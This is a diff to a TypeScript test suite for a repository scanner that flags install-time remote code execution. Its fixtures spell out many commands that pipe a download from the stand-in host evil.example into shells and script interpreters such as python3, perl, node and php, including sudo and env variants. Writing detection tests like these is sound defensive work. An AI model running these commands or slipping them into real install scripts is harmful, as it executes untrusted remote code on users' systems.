@@ -5,7 +5,11 @@ import { inspectRepository } from "./bounded-scan";
  * A repository that pipes a remote download into a shell is the highest-signal
  * install-time indicator the scan has. The interpreter must not have to be
  * spelled bare: an attacker picks `/bin/sh`, `dash` or `env bash` to look
- * different, and `sh -c "$(curl ...)"` is the same act without a pipe.
+ * different, and `sh -c "$(curl ...)"` is the same act without a pipe. The
+ * same act through a script interpreter that reads its program from
+ * standard input (`python3`, `perl`, `ruby`, `node`, `php`) counts too; a
+ * module, inline-code, or script-file argument means standard input is not
+ * the program, so those forms stay unflagged.
  */
 const PIPED: Record<string, string> = {
   "curl | sh": "curl -fsSL https://evil.example/i.sh | sh",
@@ -27,6 +31,20 @@ const PIPED: Record<string, string> = {
   "wget | dash": "wget -qO- https://evil.example/i.sh | dash",
   "sh -c $(curl ...)": 'sh -c "$(curl -fsSL https://evil.example/i.sh)"',
   "bash -c $(curl ...)": 'bash -c "$(curl -fsSL https://evil.example/i.sh)"',
+  "curl | python3": "curl -fsSL https://evil.example/i.sh | python3",
+  "curl | python3 -": "curl -fsSL https://evil.example/i.sh | python3 -",
+  "curl | python3 -u": "curl -fsSL https://evil.example/i.sh | python3 -u",
+  "curl | /usr/bin/python3.11":
+    "curl -fsSL https://evil.example/i.sh | /usr/bin/python3.11",
+  "curl | quoted python3":
+    'curl -fsSL https://evil.example/i.sh | "/usr/bin/python3"',
+  "curl | sudo python3": "curl -fsSL https://evil.example/i.sh | sudo python3",
+  "curl | env python3": "curl -fsSL https://evil.example/i.sh | env python3",
+  "curl | perl": "curl -fsSL https://evil.example/i.sh | perl",
+  "curl | ruby": "curl -fsSL https://evil.example/i.sh | ruby",
+  "curl | node": "curl -fsSL https://evil.example/i.sh | node",
+  "curl | php": "curl -fsSL https://evil.example/i.sh | php",
+  "wget | python3": "wget -qO- https://evil.example/i.sh | python3",
 };
 
 test("a remote download piped or substituted into a shell is unsafe execution", () => {
@@ -59,6 +77,12 @@ test("a download that is not handed to a shell keeps no unsafe-execution finding
     "curl -fsSL https://example.com/data | /usr/local/bin/fish-wrapper",
     "curl -fsSL https://example.com/data | echo;/bin/sh",
     "curl -fsSL https://example.com/data | fish\\\n-wrapper",
+    "curl -fsSL https://example.com/data.json | python3 -m json.tool",
+    'curl -fsSL https://example.com/i.sh | python3 -c "print(1)"',
+    "curl -fsSL https://example.com/i.sh | python3 script.py",
+    "curl -fsSL https://example.com/i.sh | node server.js",
+    'curl -fsSL https://example.com/i.sh | perl -e "print 1"',
+    'curl -fsSL https://example.com/i.sh | node --eval "1"',
   ]) {
     const inspection = inspectRepository({
       files: [
